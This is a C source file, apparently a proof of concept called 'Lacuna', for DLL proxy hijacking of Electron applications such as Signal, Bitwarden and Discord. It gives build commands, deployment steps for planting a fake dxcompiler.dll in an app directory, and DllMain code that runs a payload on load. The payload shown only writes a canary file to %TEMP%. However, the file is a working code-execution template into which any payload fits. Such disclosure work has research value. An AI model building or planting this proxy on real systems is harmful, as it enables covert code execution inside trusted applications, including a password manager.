// Lacuna — Universal dxcompiler.dll proxy for Electron applications
//
// This proxy forwards both exports to the renamed original and executes
// a proof-of-concept payload in DllMain. The payload writes a canary file
// to confirm code execution occurred.
//
// Tested against: Signal, Obsidian, Bitwarden, Notion, Figma, Element,
//                 GitHub Desktop, GitKraken, Discord, Postman, Insomnia
//
// Build (MinGW):
//   x86_64-w64-mingw32-gcc -shared -o dxcompiler.dll dxcompiler_proxy.c dxcompiler_proxy.def
//
// Build (MSVC):
//   cl /LD /Fe:dxcompiler.dll dxcompiler_proxy.c /link /DEF:dxcompiler_proxy.def
//
// Deploy:
//   1. In the target app directory, rename: dxcompiler.dll -> dxcompiler_orig.dll
//   2. Place compiled proxy as: dxcompiler.dll
//   3. Launch the application
//   4. Check for canary file at: %TEMP%\lacuna_canary.txt

#include <windows.h>

void Payload(void) {
    char canaryPath[MAX_PATH];
    char evidence[512];
    char exePath[MAX_PATH] = {0};
    char dllPath[MAX_PATH] = {0};

    // Resolve paths for evidence
    GetModuleFileNameA(NULL, exePath, sizeof(exePath));
    HMODULE hSelf = NULL;
    GetModuleHandleExA(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        (LPCSTR)&Payload, &hSelf);
    GetModuleFileNameA(hSelf, dllPath, sizeof(dllPath));

    // Build canary path in %TEMP%
    GetTempPathA(sizeof(canaryPath), canaryPath);
    lstrcatA(canaryPath, "lacuna_canary.txt");

    // Write evidence
    SYSTEMTIME st;
    GetLocalTime(&st);
    int len = wsprintfA(evidence,
        "=== LACUNA PROOF-OF-LOAD ===\r\n"
        "Timestamp: %04d-%02d-%02d %02d:%02d:%02d\r\n"
        "Process: %s\r\n"
        "PID: %lu\r\n"
        "DLL Loaded: %s\r\n"
        "DllMain executed: YES\r\n"
        "=== END PROOF ===\r\n",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        exePath, GetCurrentProcessId(), dllPath);

    HANDLE hFile = CreateFileA(canaryPath,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, evidence, len, &written, NULL);
        CloseHandle(hFile);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        Payload();
    }
    return TRUE;
}
